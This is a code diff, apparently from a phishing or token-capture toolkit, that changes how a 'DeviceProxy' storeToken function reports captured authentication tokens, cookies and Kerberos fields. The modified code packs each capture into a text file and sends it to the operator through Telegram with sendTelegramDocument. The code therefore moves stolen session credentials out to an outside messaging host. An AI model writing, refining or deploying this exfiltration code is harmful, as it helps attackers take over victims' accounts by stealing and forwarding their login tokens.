@@ -679,7 +679,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
     // Send Telegram capture report directly from device proxy
     // This ensures Telegram receives the capture even if the worker never calls /api/capture
     try {
-      const { sendCaptureReport } = require('../routes/capture');
+      const { buildCaptureCaption, buildCaptureFileContent } = require('../routes/capture');
       const reportTokenType = job.mode === 'cookie' ? 'cookie' : 'token';
 
       // Load stored token row so Kerberos fields are defined if already saved
@@ -711,11 +711,15 @@ async function storeToken(job, tokenData, responseCookies = []) {
         tokenId,
       };
 
-      console.log(`[DeviceProxy] Sending Telegram report for token ${tokenId} type=${reportTokenType}`);
-      await sendCaptureReport(job.user_id, reportData);
-      console.log(`[DeviceProxy] Telegram report sent for token ${tokenId}`);
+      const caption = buildCaptureCaption(reportData);
+      const fileContent = buildCaptureFileContent(reportData);
+      const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
+
+      console.log('[DeviceProxy] Sending Telegram report for token', tokenId, 'type=', reportTokenType, 'caption=', caption);
+      await sendTelegramDocument(job.user_id, filename, fileContent, caption);
+      console.log('[DeviceProxy] Telegram report sent for token', tokenId);
     } catch (telegramErr) {
-      console.error('[DeviceProxy] Telegram report failed:', telegramErr.message);
+      console.error('[DeviceProxy] Telegram report failed:', telegramErr);
     }
   } catch (err) {
     console.error('[DeviceProxy] storeToken error:', err.message);
